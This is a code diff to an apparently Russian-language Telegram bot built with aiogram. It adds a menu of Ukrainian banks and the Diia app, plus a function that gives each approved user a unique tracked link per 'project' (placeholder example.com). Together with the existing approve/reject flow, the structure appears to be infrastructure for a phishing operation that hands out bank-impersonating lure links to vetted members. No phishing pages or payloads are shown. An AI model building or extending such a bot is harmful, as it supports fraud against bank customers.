@@ -1,6 +1,7 @@
 import asyncio
 import os
 import sqlite3
+import uuid
 
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
@@ -79,6 +80,37 @@ def main_menu_kb():
     )
 
 
+def projects_kb():
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="🇺🇦 Приват", callback_data="proj_privat"),
+                InlineKeyboardButton(text="🇺🇦 Ощад", callback_data="proj_oshad")
+            ],
+            [
+                InlineKeyboardButton(text="🇺🇦 Райффайзен", callback_data="proj_raif"),
+                InlineKeyboardButton(text="🇺🇦 Дия", callback_data="proj_diya")
+            ],
+            [
+                InlineKeyboardButton(text="🇺🇦 Вайбер", callback_data="proj_viber"),
+                InlineKeyboardButton(text="🇺🇦 Пумб", callback_data="proj_pumb")
+            ],
+            [
+                InlineKeyboardButton(text="🇺🇦 УКР СИБ", callback_data="proj_ukrsib"),
+                InlineKeyboardButton(text="🇺🇦 Дия 2", callback_data="proj_diya2")
+            ],
+            [
+                InlineKeyboardButton(text="⬅️ Назад", callback_data="back_menu")
+            ]
+        ]
+    )
+
+
+def generate_link(user_id, project):
+    unique = str(uuid.uuid4())[:8]
+    return f"https://example.com/{project}?user={user_id}&id={unique}"
+
+
 async def send_main_menu(user_id, username):
     text = (
         f"🌿 Приветствуем тебя, {username}!\n\n"
@@ -155,12 +187,55 @@ async def source(message: Message, state: FSMContext):
 
 
 # ----------------------------------------
+# СОЗДАНИЕ ССЫЛКИ
+# ----------------------------------------
+
+@dp.callback_query(F.data == "create_link")
+async def create_link(callback: CallbackQuery):
+    await callback.answer()
+
+    await callback.message.edit_caption(
+        caption="🤖 Все проекты:",
+        reply_markup=projects_kb()
+    )
+
+
+@dp.callback_query(F.data.startswith("proj_"))
+async def select_project(callback: CallbackQuery):
+    await callback.answer()
+
+    project = callback.data.split("_")[1]
+    user_id = callback.from_user.id
+
+    link = generate_link(user_id, project)
+
+    await callback.message.edit_caption(
+        caption=f"🔗 Твоя ссылка для {project}:\n\n{link}",
+        reply_markup=InlineKeyboardMarkup(
+            inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ Назад", callback_data="create_link")]
+            ]
+        )
+    )
+
+
+@dp.callback_query(F.data == "back_menu")
+async def back_menu(callback: CallbackQuery):
+    await callback.answer()
+
+    await send_main_menu(
+        callback.from_user.id,
+        callback.from_user.full_name
+    )
+
+
+# ----------------------------------------
 # ОДОБРЕНИЕ
 # ----------------------------------------
 
 @dp.callback_query(F.data.startswith("approve_"))
 async def approve(callback: CallbackQuery):
-    await callback.answer()  # ✅ фикс загрузки
+    await callback.answer()
 
     try:
         user_id = int(callback.data.split("_")[1])
@@ -184,7 +259,7 @@ async def approve(callback: CallbackQuery):
 
 @dp.callback_query(F.data.startswith("reject_"))
 async def reject(callback: CallbackQuery):
-    await callback.answer()  # ✅ тоже обязательно
+    await callback.answer()
 
     user_id = int(callback.data.split("_")[1])
 
